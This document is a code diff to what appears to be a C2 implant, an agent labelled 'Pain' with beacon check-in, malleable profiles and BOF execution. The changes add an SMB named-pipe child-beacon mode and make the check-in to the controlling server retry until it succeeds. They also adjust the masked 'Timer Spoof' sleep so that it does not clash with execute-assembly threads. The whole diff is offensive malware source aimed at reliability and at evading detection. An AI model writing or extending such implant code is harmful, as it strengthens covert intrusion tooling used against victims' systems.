@@ -295,6 +295,11 @@ DECLFN void Root::Agent::Init()
     // Parse malleable profile blob; sets Self->Config.Callbacks[] when count > 0
     Malleable_Init();
 
+#if PAIN_PROFILE_C2 == PROFILE_SMB
+    // Initialise named-pipe config for SMB child beacon mode
+    Config_Smb_Init();
+#endif
+
     Self->Ntdll.DbgPrint( "[Pain] Init() done\n" );
 }
 
@@ -302,7 +307,12 @@ DECLFN void Root::Agent::Init()
 DECLFN void Root::Agent::Start()
 {
     G_AGENT;
-    Transport_Checkin();
+
+    // Retry until the checkin is fully delivered (pipe write succeeded + parent read it).
+    // Without this loop, an SMB Phase-1 WriteFile failure falls through to Transport_Poll,
+    // which sends 36-byte poll data as "checkin" → server rejects with "bad magic".
+    while ( !Transport_Checkin() )
+        Beacon_Sleep( 1000 );
 
     while ( TRUE )
     {
@@ -318,6 +328,14 @@ DECLFN void Root::Agent::Start()
             }
         }
 
-        Beacon_Sleep( Self->Config.Sleep * 1000 );
+        // If a BOF ran this cycle, skip Timer Spoof once: CLR thread pool threads
+        // created by execute-assembly conflict with NtSetContextThread manipulation.
+        // Plain Sleep gives the CLR time to drain before the next masked sleep.
+        if ( Self->Bof.BofRan ) {
+            Self->Bof.BofRan = FALSE;
+            Self->Krnl32.Sleep( Self->Config.Sleep * 1000 );
+        } else {
+            Beacon_Sleep( Self->Config.Sleep * 1000 );
+        }
     }
 }
